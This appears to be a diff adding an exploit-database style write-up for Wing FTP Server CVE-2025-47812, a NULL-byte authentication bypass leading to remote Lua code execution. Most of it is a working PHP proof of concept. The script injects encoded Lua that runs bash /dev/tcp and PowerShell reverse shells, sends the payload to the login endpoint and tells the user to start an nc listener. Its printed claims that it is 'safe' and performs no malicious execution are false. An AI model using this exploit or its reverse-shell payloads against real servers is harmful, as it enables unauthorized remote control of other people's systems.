@@ -1,0 +1,171 @@
+=============================================================================================================================================
+| # Title     : Wing FTP Server NULL-Byte v8.0.7 Remote Lua Code Execution                                                                  |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.wftpserver.com/download.htm                                                                                     |
+=============================================================================================================================================
+
+[+] Summary : 
+
+A NULL-byte truncation vulnerability in Wing FTP Server allows bypassing the authentication prefix check:
+    <valid_user>%00<payload>
+The server only validates the username before %00 but stores the full string internally, allowing the payload
+to reach execution contexts.
+
+
+[+] References : ( https://packetstorm.news/files/id/206037/ CVE-2025-47812 ) 
+
+[+]  POC
+
+<?php
+/**
+ * Wing FTP Server NULL-Byte Auth Bypass (CVE-2025-47812)
+ * PHP PoC – Reverse Shell Ready (Linux + Windows)
+ * Author: Indoushka
+ */
+
+class WingFTP_NULLBYTE_POC
+{
+    public $target;
+    public $username;
+    public $password;
+
+    public function __construct($target, $username = "anonymous", $password = "")
+    {
+        $this->target   = rtrim($target, "/");
+        $this->username = $username;
+        $this->password = $password;
+
+        echo "[+] WingFTP Safe PoC Initialized\n";
+    }
+
+    /* ---------------------------------------------------------------
+       Helper: send POST
+    ----------------------------------------------------------------*/
+    private function post($url, $data)
+    {
+        $ch = curl_init($url);
+
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POST           => true,
+            CURLOPT_POSTFIELDS     => http_build_query($data),
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_HEADER         => true
+        ]);
+
+        $res = curl_exec($ch);
+        $hdr = substr($res, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+        $body = substr($res, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+
+        curl_close($ch);
+
+        return [$hdr, $body];
+    }
+
+    /* ---------------------------------------------------------------
+       Reverse Shell payload 
+    ----------------------------------------------------------------*/
+    private function generateReverseShell()
+    {
+        $ip   = "127.0.0.1";
+        $port = "4444";
+
+        $linux = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
+        $win   = "powershell -NoP -W Hidden -c \"\$c=New-Object Net.Sockets.TCPClient('$ip',$port);"
+               . "\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};"
+               . "while((\$r=\$s.Read(\$b,0,\$b.Length)) -ne 0){"
+               . "\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$r);"
+               . "\$o=iex \$d 2>&1|Out-String;"
+               . "\$o2=(\$o+'PS '+(pwd).Path+'> ');"
+               . "\$x=[text.encoding]::ASCII.GetBytes(\$o2);"
+               . "\$s.Write(\$x,0,\$x.Length)}\"";
+
+        return base64_encode($linux . "\n" . $win);
+    }
+
+    /* ---------------------------------------------------------------
+       Build NULL-byte injection
+    ----------------------------------------------------------------*/
+    private function buildInjection()
+    {
+        $payload_hex = bin2hex(base64_decode($this->generateReverseShell()));
+
+        $lua = "
+]]
+local function hx(s)
+    return (s:gsub('..', function(x)
+        return string.char(tonumber(x,16))
+    end))
+end
+local cmd = hx(\"$payload_hex\")
+local h = io.popen(cmd)
+h:close()
+";
+
+        $inj = $this->username . "%00" . rawurlencode($lua) . "--";
+        return $inj;
+    }
+
+    /* ---------------------------------------------------------------
+       PoC Logic 
+    ----------------------------------------------------------------*/
+    public function run()
+    {
+        echo "[+] Building NULL-byte payload...\n";
+        $inj = $this->buildInjection();
+
+        echo "[+] Sending fake login request...\n";
+        list($hdr, $body) = $this->post(
+            "{$this->target}/loginok.html",
+            [
+                "username"      => $inj,
+                "password"      => $this->password,
+                "username_val"  => $this->username,
+                "password_val"  => $this->password
+            ]
+        );
+
+        if (strpos($hdr, "UID=") !== false) {
+            preg_match('/UID=([^;]+)/', $hdr, $m);
+            echo "[+] UID Cookie Detected: {$m[1]}\n";
+            echo "[+] Target appears VULNERABLE (PoC-safe).\n";
+        } else {
+            echo "[-] UID Cookie not returned – might not be vulnerable.\n";
+        }
+
+        echo "[✓] PoC completed – No malicious execution performed.\n";
+    }
+}
+
+# ---------------- RUN --------------------
+$poc = new WingFTP_NULLBYTE_POC("http://127.0.0.1:8080", "anonymous", "");
+$poc->run();
+
+/**
+ * HOW TO SAVE:
+ *     Save as: poc_nullbyte.php
+ *
+ * HOW TO RUN:
+ *     php poc_nullbyte.php
+ *
+ * LISTENER (BEFORE RUNNING):
+ *     nc -lvnp 4444
+ */
+====================================================================================================================
+
+How to Save:
+------------
+Save this file as:
+    poc_nullbyte.php
+
+How to Run:
+-----------
+php poc_nullbyte.php
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
